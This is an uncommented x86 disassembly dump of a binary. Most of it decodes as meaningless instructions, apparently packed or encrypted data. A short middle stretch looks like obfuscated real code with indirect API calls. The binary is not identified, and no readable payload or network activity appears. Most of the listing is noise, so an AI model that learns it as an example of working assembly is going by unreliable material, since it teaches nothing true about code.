  408b8c:	fimul  DWORD PTR [ecx-0x577f2bcf]
  408b92:	jl     0x408b6c
  408b94:	ins    DWORD PTR es:[edi],dx
  408b95:	or     DWORD PTR [ebp-0x90ff247],edi
  408b9b:	test   DWORD PTR [ebp-0x38],edi
  408b9e:	idiv   BYTE PTR [ecx+0x53da60f4]
  408ba4:	test   al,0xc
  408ba6:	mov    ebp,0xcea360da
  408bab:	hlt    
  408bac:	mov    eax,0xe295532c
  408bb1:	sub    ah,BYTE PTR [edx]
  408bb3:	sub    DWORD PTR [edi+0x49],eax
  408bb6:	ja     0x408c16
  408bb8:	jnp    0x408bd2
  408bba:	mov    edi,0x5537400a
  408bbf:	cmp    eax,0x8c9e916f
  408bc4:	sar    dl,0xfd
  408bc7:	jge    0x408c47
  408bc9:	ret    0xdaa2
  408bcc:	lds    esp,FWORD PTR [ebx-0x50]
  408bcf:	aam    0x66
  408bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bd2:	adc    al,0x28
  408bd4:	retf   
  408bd5:	push   esi
  408bd6:	pusha  
  408bd7:	xchg   esp,eax
  408bd8:	jmp    0x95124be0
  408bdd:	retf   
  408bde:	mov    edi,0xc25071a0
  408be3:	mov    edi,0xe21ac80c
  408be8:	push   es
  408be9:	fucomp st(1)
  408beb:	cmp    eax,0x2fa8150c
  408bf0:	mov    ecx,0x51902bbf
  408bf5:	rcl    ebp,1
  408bf7:	pusha  
  408bf8:	test   al,0xa
  408bfa:	pminub mm1,mm7
  408bfd:	fwait
  408bfe:	enter  0x1754,0x22
  408c02:	mov    dh,0xa7
  408c04:	addr16 pop ds
  408c06:	mov    ah,0xaa
  408c08:	arpl   WORD PTR [eax+eiz*1],bx
  408c0b:	push   esi
  408c0c:	std    
  408c0d:	sar    eax,1
  408c0f:	mov    bh,BYTE PTR [edx+0x33bbf37]
  408c15:	lods   al,BYTE PTR ds:[esi]
  408c16:	sub    DWORD PTR ds:0xb0323247,ecx
  408c1c:	inc    ebx
  408c1d:	jl     0x408c6a
  408c1f:	scas   al,BYTE PTR es:[edi]
  408c20:	pop    ebp
  408c21:	xor    al,0x75
  408c23:	xlat   BYTE PTR ds:[ebx]
  408c24:	or     BYTE PTR [ebx+0x34],0xf5
  408c28:	ins    BYTE PTR es:[edi],dx
  408c29:	mov    cs,WORD PTR [ebp+0x4744d258]
  408c2f:	and    al,0xbb
  408c31:	test   al,0x77
  408c33:	out    dx,eax
  408c34:	out    0x92,eax
  408c36:	xchg   BYTE PTR [eax],dl
  408c38:	jne    0x408c4f
  408c3a:	add    ecx,DWORD PTR [edi]
  408c3c:	cmc    
  408c3d:	mov    dl,0xf7
  408c3f:	(bad)  
  408c40:	pop    esp
  408c41:	cmp    bh,BYTE PTR [edi]
  408c43:	sub    BYTE PTR [eax+0x647abe01],ah
  408c49:	scas   al,BYTE PTR es:[edi]
  408c4a:	int3   
  408c4b:	inc    ebx
  408c4c:	retf   
  408c4d:	retf   0x55ea
  408c50:	ds aaa 
  408c52:	mov    al,0xdc
  408c54:	xor    DWORD PTR [edx+0x7],eax
  408c57:	hlt    
  408c58:	push   ds
  408c59:	xchg   edi,eax
  408c5a:	and    bh,BYTE PTR [eax-0x981c298]
  408c60:	add    edx,edi
  408c62:	sub    al,0x6c
  408c64:	jecxz  0x408c1b
  408c66:	loop   0x408c2d
  408c68:	sub    eax,0x74d2fc32
  408c6d:	xor    eax,DWORD PTR [esi+0x72]
  408c70:	mov    ah,0x71
  408c72:	call   0xe5ab:0xdc3149c5
  408c79:	lahf   
  408c7a:	sub    eax,0x93b63590
  408c7f:	ror    ah,0x71
  408c82:	stos   BYTE PTR es:[edi],al
  408c83:	mov    edi,eax
  408c85:	stc    
  408c86:	pop    ss
  408c87:	mov    edi,0xa5bb10fe
  408c8c:	(bad)  
  408c8d:	stc    
  408c8e:	sar    BYTE PTR [ecx],0x68
  408c91:	push   cs
  408c92:	xchg   edi,eax
  408c93:	sar    bh,cl
  408c95:	xchg   edi,eax
  408c96:	xlat   BYTE PTR ds:[ebx]
  408c97:	loopne 0x408cfc
  408c99:	loop   0x408cdc
  408c9b:	(bad)  
  408c9c:	aam    0x8b
  408c9e:	rcl    BYTE PTR [ebx],0x56
  408ca1:	mov    esi,0xe1cffb0a
  408ca6:	xchg   ebx,eax
  408ca7:	push   ebx
  408ca8:	jp     0x408c7b
  408caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cab:	xor    DWORD PTR [edi+ebx*1+0x463523a7],edi
  408cb2:	jl     0x408c84
  408cb4:	daa    
  408cb5:	add    DWORD PTR ds:0x80d13537,edx
  408cbb:	ss push ebx
  408cbd:	sbb    al,0x54
  408cbf:	pop    ecx
  408cc0:	jmp    0xe7565956
  408cc5:	xchg   ebp,eax
  408cc6:	pushf  
  408cc7:	inc    esi
  408cc8:	lds    ebx,FWORD PTR [edi]
  408cca:	rol    BYTE PTR [edx+0x5b12b5c9],cl
  408cd0:	xchg   ecx,eax
  408cd1:	adc    eax,0x7f7658af
  408cd7:	dec    eax
  408cd8:	das    
  408cd9:	xor    dl,ah
  408cdb:	mov    dl,0xa
  408cdd:	sar    DWORD PTR [ebx-0xb4eaa5c],cl
  408ce3:	jb     0x408cb4
  408ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ce6:	int    0xa9
  408ce8:	cmp    al,0xcf
  408cea:	jecxz  0x408d27
  408cec:	xor    eax,ecx
  408cee:	in     eax,dx
  408cef:	adc    al,0x24
  408cf1:	xchg   BYTE PTR [ebx+0x7f],al
  408cf4:	or     dl,BYTE PTR [eax]
  408cf6:	les    edi,FWORD PTR [ecx-0x4f]
  408cf9:	sub    al,BYTE PTR [edx+0x2f]
  408cfc:	xor    bh,al
  408cfe:	sub    eax,0xea5bcf0d
  408d03:	inc    ebx
  408d04:	or     al,0xf0
  408d06:	pop    eax
  408d07:	(bad)  
  408d08:	xchg   ebp,eax
  408d09:	pop    edi
  408d0a:	into   
  408d0b:	mov    ch,0xa
  408d0d:	jmp    0x1fc:0xa6b15c5e
  408d14:	iret   
  408d15:	push   esi
  408d16:	sub    DWORD PTR [eax+0x58],0xe979afe2
  408d1d:	jbe    0x408d80
  408d1f:	icebp  
  408d20:	cmp    eax,0x5ef4adfc
  408d25:	jl     0x408d0a
  408d27:	arpl   bx,ax
  408d29:	pop    es
  408d2a:	xchg   ecx,eax
  408d2b:	test   eax,0x6217d762
  408d30:	xchg   DWORD PTR [eax+0x16],esi
  408d33:	push   0xffffff8d
  408d35:	push   0x5d
  408d37:	mov    gs,WORD PTR [esi-0x49]
  408d3a:	sbb    al,0x51
  408d3c:	ret    
  408d3d:	add    BYTE PTR [edx+0x5ded7272],0xe4
  408d44:	pushaw 
  408d46:	out    0x65,eax
  408d48:	out    0x12,al
  408d4a:	clc    
  408d4b:	mov    WORD PTR [ecx],fs
  408d4d:	retf   
  408d4e:	(bad)  
  408d4f:	addr16 ja 0x408d82
  408d52:	fnstenv cs:[esi]
  408d55:	and    eax,0xbf3d6e98
  408d5a:	scas   al,BYTE PTR es:[edi]
  408d5b:	in     eax,dx
  408d5c:	ins    DWORD PTR es:[edi],dx
  408d5d:	push   esi
  408d5e:	sub    al,0xe3
  408d60:	pop    ds
  408d61:	sub    dh,BYTE PTR [edi+0x10]
  408d64:	lods   eax,DWORD PTR ds:[esi]
  408d65:	sbb    eax,0x66a2bf88
  408d6a:	mov    ah,0x84
  408d6c:	div    BYTE PTR [ecx+0x7d]
  408d6f:	(bad)
  408d72:	sub    ecx,ebp
  408d74:	or     BYTE PTR [esi+edx*4+0x41b95d22],cl
  408d7b:	fsubr  QWORD PTR [ecx-0x24]
  408d7e:	stc    
  408d7f:	mov    eax,0x7089621b
  408d84:	dec    ecx
  408d85:	push   ss
  408d86:	pop    ebx
  408d87:	pop    edx
  408d88:	or     BYTE PTR [ecx-0x31961cce],ch
  408d8e:	xor    DWORD PTR [ecx],ebx
  408d90:	ret    
  408d91:	or     al,0x7
  408d93:	ins    DWORD PTR es:[edi],dx
  408d94:	sub    edi,ecx
  408d96:	stos   BYTE PTR es:[edi],al
  408d97:	es push esi
  408d99:	xchg   ebp,eax
  408d9a:	or     bl,ch
  408d9c:	jns    0x408d4e
  408d9e:	jne    0x408dfc
  408da0:	xchg   ecx,eax
  408da1:	adc    eax,0x8c4cedf7
  408da6:	xor    al,0x4b
  408da8:	js     0x408dbe
  408daa:	(bad)  
  408dab:	inc    BYTE PTR [edx+0x2758ccdb]
  408db1:	dec    esp
  408db2:	les    esi,FWORD PTR [edx]
  408db4:	mov    eax,0x68db4173
  408db9:	inc    edx
  408dba:	sub    ecx,ecx
  408dbc:	jb     0x408dc6
  408dbe:	dec    esp
  408dbf:	es iret 
  408dc1:	hlt    
  408dc2:	lods   al,BYTE PTR ds:[esi]
  408dc3:	rcr    dl,cl
  408dc5:	dec    edx
  408dc6:	mov    dh,0x14
  408dc8:	mov    eax,0x363a7dae
  408dcd:	stos   DWORD PTR es:[edi],eax
  408dce:	jo     0x408e1c
  408dd0:	cmp    ebx,DWORD PTR [ecx]
  408dd2:	adc    al,0xd
  408dd4:	push   edi
  408dd5:	adc    ah,ch
  408dd7:	inc    ecx
  408dd8:	(bad)  
  408dd9:	or     BYTE PTR fs:[edi],al
  408ddc:	sub    ecx,DWORD PTR ds:[esi-0x68d974d3]
  408de3:	mov    ds:0x5cf53bac,al
  408de8:	xor    eax,0xe8b9147e
  408ded:	pop    es
  408dee:	and    esi,DWORD PTR ds:[ebp-0x23da1c0c]
  408df5:	mov    al,ds:0x5d1b0891
  408dfa:	mov    ebp,0xc6f1baa4
  408dff:	mov    ch,BYTE PTR [ecx+0x48]
  408e02:	adc    al,0xa5
  408e04:	jne    0x408e3c
  408e06:	outs   dx,DWORD PTR ds:[esi]
  408e07:	jmp    0x87ebfdad
  408e0c:	jecxz  0x408e39
  408e0e:	jl     0x408dad
  408e10:	daa    
  408e11:	ds jae 0x408df0
  408e14:	sub    DWORD PTR ds:0xd830da70,ecx
  408e1a:	arpl   bp,cx
  408e1c:	sbb    bl,BYTE PTR [ebx+0x72]
  408e1f:	mov    dl,0x40
  408e21:	cld    
  408e22:	pusha  
  408e23:	jmp    0x536e:0x8d31296
  408e2a:	out    0xab,al
  408e2c:	push   ebp
  408e2d:	hlt    
  408e2e:	pop    edi
  408e2f:	mov    esp,0x97eaf50b
  408e34:	(bad)  [ebx+0x4d4aa3b1]
  408e3a:	sbb    DWORD PTR [esi+0x5ec94808],eax
  408e40:	in     al,dx
  408e41:	out    dx,eax
  408e42:	dec    eax
  408e43:	dec    esp
  408e44:	ds dec ebp
  408e46:	mov    al,0xb0
  408e48:	cs cld 
  408e4a:	mov    ds:0x6c83bda7,eax
  408e4f:	or     cl,BYTE PTR [esi]
  408e51:	cdq    
  408e52:	cmp    DWORD PTR [ebx-0x27],0x2d46c118
  408e59:	add    ebx,0x1d
  408e5c:	cmp    BYTE PTR [edx-0x1de1c633],dh
  408e62:	jl     0x408ebb
  408e64:	sub    DWORD PTR [ecx+0x1],esp
  408e67:	fdivr  DWORD PTR [esi+edx*1]
  408e6a:	sbb    eax,0x3960358c
  408e6f:	dec    edx
  408e70:	aad    0xee
  408e72:	jle    0x408eba
  408e74:	mov    al,ds:0x55bad51
  408e79:	push   edx
  408e7a:	fidiv  DWORD PTR [ecx+0x6a]
  408e7d:	mov    ebx,esi
  408e7f:	sbb    DWORD PTR [esi+0x1e15946e],ecx
  408e85:	cdq    
  408e86:	ja     0x408ef8
  408e88:	dec    esp
  408e89:	xchg   ebp,eax
  408e8a:	lods   eax,DWORD PTR ds:[esi]
  408e8b:	or     eax,0x9d6d5f92
  408e90:	adc    al,0x47
  408e92:	sub    edx,DWORD PTR [eax-0x64]
  408e95:	ins    DWORD PTR es:[edi],dx
  408e96:	push   cs
  408e97:	add    ch,BYTE PTR [edx-0x6b]
  408e9a:	pop    ebx
  408e9b:	push   es
  408e9c:	add    ch,dl
  408e9e:	and    bh,BYTE PTR [edx]
  408ea0:	jo     0x408ebf
  408ea2:	test   al,0x56
  408ea4:	cmp    al,0x10
  408ea6:	sbb    DWORD PTR [esi+0x66],ebx
  408ea9:	ds sti 
  408eab:	iret   
  408eac:	mov    bh,0x86
  408eae:	pop    edx
  408eaf:	xor    esp,ebp
  408eb1:	xchg   ebx,eax
  408eb2:	sti    
  408eb3:	mov    edi,0x10c8ce2e
  408eb8:	mov    DWORD PTR [ebx],0x42da1a5a
  408ebe:	stos   BYTE PTR es:[edi],al
  408ebf:	mov    eax,0x90af06d8
  408ec4:	mov    bl,0xa6
  408ec6:	sub    edx,esp
  408ec8:	push   0xf4cefd79
  408ecd:	push   0x73e94c59
  408ed2:	inc    edx
  408ed3:	push   0xffffffca
  408ed5:	pop    ds
  408ed6:	sub    BYTE PTR [esi-0x1c],bl
  408ed9:	adc    bh,ch
  408edb:	mov    DWORD PTR [edx+0xf319c65],edx
  408ee1:	(bad)  
  408ee2:	xchg   edx,eax
  408ee3:	clc    
  408ee4:	xchg   DWORD PTR [esi+0x40],esp
  408ee7:	pop    ebp
  408ee8:	push   edi
  408ee9:	jmp    0xa555:0x252683b3
  408ef0:	mov    ebx,0xe21805b
  408ef5:	push   ebp
  408ef6:	ins    BYTE PTR es:[edi],dx
  408ef7:	add    bl,BYTE PTR [eax-0x17]
  408efa:	sbb    ebp,DWORD PTR [edi+0x143e4f31]
  408f00:	dec    ecx
  408f01:	add    bh,BYTE PTR [eax+0x4b]
  408f04:	stc    
  408f05:	enter  0xde25,0xf1
  408f09:	or     edx,DWORD PTR [esp+eiz*2-0x3cc7e2f]
  408f10:	cmp    al,0x2b
  408f12:	rcr    BYTE PTR [esi+ebp*8],1
  408f15:	clc    
  408f16:	mov    dl,0x1a
  408f18:	and    al,0x22
  408f1a:	or     ah,BYTE PTR [edi+0x5d4b7d70]
  408f20:	sbb    eax,0xef9a36a6
  408f25:	pop    esi
  408f26:	mov    esi,0x9146bb83
  408f2b:	fsub   QWORD PTR [ebx]
  408f2d:	xor    ebp,edi
  408f2f:	loopne 0x408f8c
  408f31:	xor    al,0x45
  408f33:	and    ch,ah
  408f35:	or     BYTE PTR [ebx+0x3521fefd],dh
  408f3b:	ret    0xc073
  408f3e:	out    0x12,al
  408f40:	mov    ah,0x77
  408f42:	mov    edi,0x9003b45
  408f47:	add    ebx,DWORD PTR [esi-0x70]
  408f4a:	aaa    
  408f4b:	pop    ss
  408f4c:	xlat   BYTE PTR ds:[ebx]
  408f4d:	sbb    eax,0xd10d572a
  408f52:	lock daa 
  408f54:	stos   BYTE PTR es:[edi],al
  408f55:	jne    0x408ef5
  408f57:	mov    bh,0xbf
  408f59:	out    dx,eax
  408f5a:	in     eax,dx
  408f5b:	out    0x45,al
  408f5d:	or     ch,BYTE PTR [eax-0x6ef942e9]
  408f63:	mov    ecx,DWORD PTR [ebp-0x1c]
  408f66:	and    DWORD PTR ds:0x4229be,ecx
  408f6c:	shrd   eax,ecx,0x2
  408f70:	xor    edx,DWORD PTR ds:0x4229aa
  408f76:	shr    ecx,0x2
  408f79:	add    DWORD PTR ds:0x4228ea,0x4c61
  408f83:	mov    ecx,DWORD PTR [ebp-0x20]
  408f86:	xor    edx,DWORD PTR ds:0x4228d2
  408f8c:	mov    edx,DWORD PTR [ebp-0x1c]
  408f8f:	xor    DWORD PTR ds:0x42297e,0xf7e
  408f99:	xor    eax,edi
  408f9b:	shl    ecx,0x1e
  408f9e:	sbb    ecx,DWORD PTR ds:0x42294e
  408fa4:	xor    edx,edx
  408fa6:	cmp    DWORD PTR ds:0x422916,0x0
  408fad:	mov    ecx,0xa46
  408fb2:	mov    DWORD PTR ds:0x4229ce,0x4de7
  408fbc:	mov    DWORD PTR ds:0x42291e,ecx
  408fc2:	jmp    0x409028
  408fc7:	mov    DWORD PTR ds:0x42298a,0x3b5
  408fd1:	jne    0x40900c
  408fd7:	push   DWORD PTR [ebp-0x20]
  408fda:	push   DWORD PTR [ebp-0x1c]
  408fdd:	push   DWORD PTR [ebp-0x10]
  408fe0:	call   DWORD PTR ds:0x42a020
  408fe6:	xor    ecx,ecx
  408fe8:	add    ecx,DWORD PTR ds:0x4228c2
  408fee:	and    DWORD PTR ds:0x4229ae,ecx
  408ff4:	mov    ecx,DWORD PTR ds:0x4228f2
  408ffa:	sub    DWORD PTR ds:0x42292e,ecx
  409000:	add    ecx,DWORD PTR ds:0x4229a6
  409006:	xor    DWORD PTR ds:0x4229a2,ebx
  40900c:	mov    ecx,DWORD PTR ds:0x42298a
  409012:	or     DWORD PTR ds:0x4228f6,ecx
  409018:	adc    ecx,0x6cf8
  40901e:	adc    DWORD PTR ds:0x422962,0xa1e
  409028:	or     eax,edx
  40902a:	cmp    DWORD PTR ds:0x4228e6,0x0
  409031:	mov    DWORD PTR ds:0x42289e,0x3e29
  40903b:	mov    ecx,0x398
  409040:	jmp    0x409109
  409045:	mov    DWORD PTR ds:0x4228e6,0x60d3
  40904f:	mov    DWORD PTR ds:0x4228ce,0x6d23
  409059:	je     0x409087
  40905f:	push   DWORD PTR [ebp-0x14]
  409062:	push   DWORD PTR [ebp-0x1c]
  409065:	push   0x422835
  40906a:	push   DWORD PTR [ebp-0x28]
  40906d:	call   DWORD PTR ds:0x42a024
  409073:	sbb    DWORD PTR ds:0x42293a,0x5600
  40907d:	sub    DWORD PTR ds:0x422942,0x2629
  409087:	add    ecx,0x569a
  40908d:	sub    edx,edx
  40908f:	and    DWORD PTR ds:0x4228c6,edx
  409095:	cmp    DWORD PTR ds:0x4229ae,0x0
  40909c:	mov    DWORD PTR ds:0x42298a,0x14a0
  4090a6:	movzx  edx,BYTE PTR ds:0x42293e
  4090ad:	mov    ecx,0x236d
  4090b2:	jmp    0x409109
  4090b7:	mov    DWORD PTR ds:0x4229ae,ecx
  4090bd:	mov    DWORD PTR ds:0x42292e,0x5874
  4090c7:	jge    0x4090e5
  4090cd:	push   DWORD PTR [ebp-0x28]
  4090d0:	push   DWORD PTR [ebp-0xc]
  4090d3:	call   DWORD PTR ds:0x42a050
  4090d9:	xor    DWORD PTR ds:0x422916,edx
  4090df:	sbb    ecx,0x5177
  4090e5:	mov    ecx,DWORD PTR ds:0x4229e2
  4090eb:	mov    edx,DWORD PTR ds:0x422a62
  4090f1:	sub    ecx,edx
  4090f3:	sub    ecx,DWORD PTR [ecx+edx*1]
  4090f6:	movzx  edx,BYTE PTR ds:0x4229ca
  4090fd:	or     edx,DWORD PTR ds:0x4228d6
  409103:	mov    DWORD PTR ds:0x4229ca,edx
  409109:	lea    eax,[ebp+eax*1-0x4]
  40910d:	mov    DWORD PTR [ebp-0x34],eax
  409110:	mov    eax,DWORD PTR [ebp-0x20]
  409113:	mov    ecx,DWORD PTR [ebp-0x1c]
  409116:	shrd   eax,ecx,0x2
  40911a:	shr    ecx,0x2
  40911d:	mov    ecx,DWORD PTR [ebp-0x20]
  409120:	mov    edx,DWORD PTR [ebp-0x1c]
  409123:	jmp    0x4096ad
  409128:	add    DWORD PTR [edx+0x589575b5],ebp
  40912e:	inc    eax
  40912f:	and    dh,BYTE PTR [ebx+0x786e9c95]
  409135:	dec    ebp
  409136:	push   ds
  409137:	test   al,0xaf
  409139:	aas    
  40913a:	push   ss
  40913b:	push   ss
  40913c:	cmp    eax,0xd0161604
  409141:	fucomp st(1)
  409143:	pop    ds
  409144:	or     ebp,DWORD PTR ds:[edx+0x78e33cf9]
  40914b:	mov    gs,WORD PTR [esp+ebx*4-0x4771922d]
  409152:	cli    
  409153:	popf   
  409154:	cdq    
  409155:	sub    eax,0x1d1d60ef
  40915a:	les    esi,FWORD PTR [ecx-0x28b2a500]
  409160:	dec    eax
  409161:	jge    0x409121
  409163:	repnz sbb al,bl
  409166:	sbb    ch,BYTE PTR [ecx+0x6cea0288]
  40916c:	test   BYTE PTR [eax-0x3c3406ad],dl
  409172:	xor    edx,DWORD PTR [ebp+0x76c6c3d0]
  409178:	loop   0x4091c7
  40917a:	push   ecx
  40917b:	scas   eax,DWORD PTR es:[edi]
  40917c:	push   esp
  40917d:	out    0xa1,eax
  40917f:	push   ebp
  409180:	and    dh,BYTE PTR [ecx-0x45]
  409183:	stos   DWORD PTR es:[edi],eax
  409184:	push   0x40
  409186:	popf   
  409187:	ffree  st(7)
  409189:	push   0xcda3b210
  40918e:	adc    BYTE PTR [eax],dl
  409190:	jnp    0x40917e
  409192:	sub    eax,0xdf41d0aa
  409197:	in     al,0x1a
  409199:	mov    al,ds:0xd3d8ed96
  40919e:	push   esp
  40919f:	outs   dx,DWORD PTR ds:[esi]
  4091a0:	das    
  4091a1:	push   edi
  4091a2:	mov    dh,0x4f
  4091a4:	adc    al,0x57
  4091a6:	jl     0x409194
  4091a8:	add    ah,0xb7
  4091ab:	lea    edx,[ecx+0x3cb69831]
  4091b1:	sbb    edi,esp
  4091b3:	jmp    0x9fa3:0x52b00dd6
  4091ba:	and    DWORD PTR [edx+0x1f],ebp
  4091bd:	jmp    0x4091ec
  4091bf:	stos   BYTE PTR es:[edi],al
  4091c0:	xor    BYTE PTR ds:0xb62ff306,ah
  4091c6:	push   ebx
  4091c7:	int    0x9f
  4091c9:	(bad)  
  4091cb:	(bad)  
  4091cc:	adc    eax,0x7f12af11
  4091d1:	lods   eax,DWORD PTR ds:[esi]
  4091d2:	add    al,0xb9
  4091d4:	or     ah,ah
  4091d6:	add    ah,BYTE PTR [esi]
  4091d8:	xchg   ecx,eax
  4091d9:	dec    esi
  4091da:	les    eax,FWORD PTR [ecx]
  4091dc:	adc    al,bh
  4091de:	int3   
  4091df:	outs   dx,BYTE PTR ds:[esi]
  4091e0:	inc    ecx
  4091e1:	pop    ss
  4091e2:	adc    DWORD PTR [edi],ecx
  4091e4:	push   si
  4091e6:	clc    
  4091e7:	mov    dh,0x78
  4091e9:	loope  0x409174
  4091eb:	loop   0x40921e
  4091ed:	pmaxsw mm1,QWORD PTR [eax-0x7390094b]
  4091f4:	jbe    0x409228
  4091f6:	fsub   DWORD PTR [edx-0x3882f8b4]
  4091fc:	pushf  
  4091fd:	push   ds
  4091fe:	nop
  4091ff:	dec    ecx
  409200:	or     BYTE PTR [eax+ebx*2-0x39],0x49
  409205:	test   eax,0x3f62785c
  40920a:	inc    ebx
  40920b:	int3   
  40920c:	or     esi,0xffffffed
  40920f:	pop    ecx
  409210:	dec    ebp
  409211:	dec    edx
  409212:	clc    
  409213:	xor    BYTE PTR [edi-0x647cc35e],al
  409219:	add    al,BYTE PTR [edx+0x40]
  40921c:	mov    esi,0x690da6e7
  409221:	mov    cl,0x4a
  409223:	push   ecx
  409224:	pop    ecx
  409225:	ficom  DWORD PTR ds:0x657afc25
  40922b:	dec    esi
  40922c:	lea    edx,[esi]
  40922e:	mov    ds:0xbf1ec837,al
  409233:	test   al,0x6f
  409235:	fistp  QWORD PTR [edi-0x6f]
  409238:	popa   
  409239:	fist   DWORD PTR [eax+eiz*8+0x769824d8]
  409240:	jo     0x409296
  409242:	and    eax,0xb103f8eb
  409247:	iret   
  409248:	xchg   DWORD PTR [ecx],ecx
  40924a:	push   0x1d
  40924c:	xor    DWORD PTR [edx+0x2],eax
  40924f:	push   es
  409250:	and    DWORD PTR [eax],0x52
  409253:	mov    dl,0xa3
  409255:	mov    al,ds:0x56b3708d
  40925a:	pop    ebp
  40925b:	pop    esi
  40925c:	pop    ss
  40925d:	fwait
  40925e:	pushf  
  40925f:	test   BYTE PTR [ebp-0x1f],al
  409262:	mov    bh,0x63
  409264:	scas   eax,DWORD PTR es:[edi]
  409265:	hlt    
  409266:	loop   0x4092d4
  409268:	aam    0x2e
  40926a:	cs sbb eax,0xb89ad44f
  409270:	test   eax,0x94d5831d
  409275:	and    bh,BYTE PTR [eax]
  409277:	inc    esp
  409278:	stos   BYTE PTR es:[edi],al
  409279:	ja     0x4092f3
  40927b:	xor    BYTE PTR [edi+0x9e2b928],cl
  409281:	cdq    
  409282:	mov    bh,BYTE PTR [ecx]
  409284:	add    eax,0x7337d273
  409289:	fst    st(5)
  40928b:	fcomp  st(6)
  40928d:	pextrw edi,(bad),0xc5
  40928f:	jnp    0x40925b
  409291:	dec    esi
  409292:	sbb    eax,0x1c29f82c
  409297:	sahf   
  409298:	dec    edi
  409299:	cmp    eax,0x14c9a53d
  40929e:	mov    edi,0x30db70ef
  4092a3:	inc    ebp
  4092a4:	pusha  
  4092a5:	xor    al,0xc8
  4092a7:	cmp    esp,ecx
  4092a9:	dec    edx
  4092aa:	push   ds
  4092ab:	xor    BYTE PTR [eax],dh
  4092ad:	push   ebx
  4092ae:	mov    dl,0x18
  4092b0:	adc    esi,edi
  4092b2:	mul    bl
  4092b4:	push   ecx
  4092b5:	xchg   ebx,eax
  4092b6:	adc    dh,bl
  4092b8:	ficom  WORD PTR [ebx+0x42]
  4092bb:	inc    ebp
  4092bc:	outs   dx,DWORD PTR ds:[esi]
  4092bd:	pop    ebx
  4092be:	aad    0x3d
  4092c0:	daa    
  4092c1:	pop    es
  4092c2:	pop    esp
  4092c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092c4:	and    eax,0x6c3c2cd2
  4092c9:	inc    ecx
  4092ca:	inc    esi
  4092cb:	xchg   edi,eax
  4092cc:	mov    bh,0x57
  4092ce:	fadd   QWORD PTR [esi-0x7fe0a29d]
  4092d4:	mov    al,0xdc
  4092d6:	(bad)  
  4092d7:	mov    ds:0xb9b2e029,al
  4092dc:	xchg   ebx,eax
  4092dd:	pushf  
  4092de:	aas    
  4092df:	jns    0x409335
  4092e1:	mov    ah,0x6a
  4092e3:	and    ax,0x7754
  4092e7:	or     esp,DWORD PTR [ecx]
  4092e9:	in     eax,dx
  4092ea:	or     cl,BYTE PTR [eax+0x75]
  4092ed:	sub    eax,0x5e046fb0
  4092f2:	pusha  
  4092f3:	pop    ebx
  4092f4:	adc    BYTE PTR [ebp-0x6204dc8e],dh
  4092fa:	clc    
  4092fb:	mov    ch,0xe5
  4092fd:	or     DWORD PTR [ebx-0x6a],esp
  409300:	xor    bl,BYTE PTR [edx-0x70]
  409303:	out    dx,eax
  409304:	out    0x25,eax
  409306:	xor    eax,0xfd56b0e
  40930b:	pushf  
  40930c:	jmp    0x409339
  40930e:	mov    ss,WORD PTR [edi+edi*4+0x1b]
  409312:	mov    esp,fs
  409314:	addr16 in eax,dx
  409316:	mov    eax,ds:0x54c30311
  40931b:	outs   dx,BYTE PTR ds:[esi]
  40931c:	dec    eax
  40931d:	das    
  40931e:	and    al,0xa3
  409320:	mov    bh,0x94
  409322:	push   ss
  409323:	in     al,0x78
  409325:	in     eax,dx
  409326:	push   esi
  409327:	xchg   ebp,eax
  409328:	sub    eax,0x1c34ad44
  40932d:	shr    BYTE PTR fs:[ebx-0x7b],cl
  409331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409332:	jp     0x4093a1
  409334:	dec    edi
  409335:	xchg   esi,eax
  409336:	outs   dx,BYTE PTR ds:[esi]
  409337:	dec    ebx
  409338:	fwait
  409339:	loopne 0x40938a
  40933b:	mov    esp,0xe8cf6433
  409340:	imul   edx,DWORD PTR [ebx],0x33
  409343:	pop    edx
  409344:	and    dl,BYTE PTR [edi-0x2ac6ed82]
  40934a:	int    0xb6
  40934c:	imul   edi,DWORD PTR [esi+0x1240f979],0xffffffa7
  409353:	or     BYTE PTR [edi],ah
  409355:	mov    eax,ds:0x3c6185c1
  40935a:	pop    esi
  40935b:	pop    edi
  40935c:	mov    cl,0x66
  40935e:	daa    
  40935f:	xchg   ebx,eax
  409360:	mov    al,ds:0x4beb8e69
  409365:	jge    0x409357
  409367:	je     0x40936c
  409369:	push   ds
  40936a:	and    BYTE PTR [ecx+0x1d6fe7ae],0x51
  409371:	(bad)  
  409372:	mov    edi,0x673e4758
  409377:	clc    
  409378:	rcr    BYTE PTR ds:0x1494ce04,cl
  40937e:	sti    
  40937f:	nop
  409380:	sub    esi,esi
  409382:	jns    0x4093f7
  409384:	js     0x409397
  409386:	cdq    
  409387:	pop    ebx
  409388:	aas    
  409389:	sub    eax,edx
  40938b:	ror    edi,0x7c
  40938e:	sub    BYTE PTR [edi+0x35],0x96
  409392:	ds popf 
  409394:	mov    ds:0xd276d578,eax
  409399:	jp     0x409396
  40939b:	sub    esi,DWORD PTR [esi]
  40939d:	sub    DWORD PTR cs:[edx-0x54],edi
  4093a1:	pop    ebp
  4093a2:	adc    al,0x50
  4093a4:	sti    
  4093a5:	fldenv [edx+ebx*2]
  4093a8:	or     cl,ch
  4093aa:	leave  
  4093ab:	and    bh,BYTE PTR [ecx]
  4093ad:	push   eax
  4093ae:	imul   edi,DWORD PTR [edx-0x7f],0xf3ed5f75
  4093b5:	add    dh,dh
  4093b7:	sbb    DWORD PTR [eax+edx*1-0x6b],0xffffffa2
  4093bc:	stos   BYTE PTR es:[edi],al
  4093bd:	ss push bp
  4093c0:	ficomp WORD PTR [edi+0x7734c910]
  4093c6:	inc    esp
  4093c7:	xor    eax,0xca5a8f35
  4093cc:	sub    DWORD PTR [edi-0x6e],ecx
  4093cf:	jb     0x4093ef
  4093d1:	sbb    dh,BYTE PTR [esi]
  4093d3:	std    
  4093d4:	push   esp
  4093d5:	data16 scas al,BYTE PTR es:[edi]
  4093d7:	rcl    BYTE PTR [edx+0x6477467b],1
  4093dd:	(bad)  
  4093de:	das    
  4093df:	rol    BYTE PTR [edx+0x65],0xee
  4093e3:	rcr    DWORD PTR [esi+ebx*2+0x6c61d5a9],cl
  4093ea:	scas   al,BYTE PTR es:[edi]
  4093eb:	(bad)  
  4093ec:	popa   
  4093ed:	ret    
  4093ee:	rol    BYTE PTR [eax-0x29c37308],0x48
  4093f5:	inc    edx
  4093f6:	sbb    al,0xfd
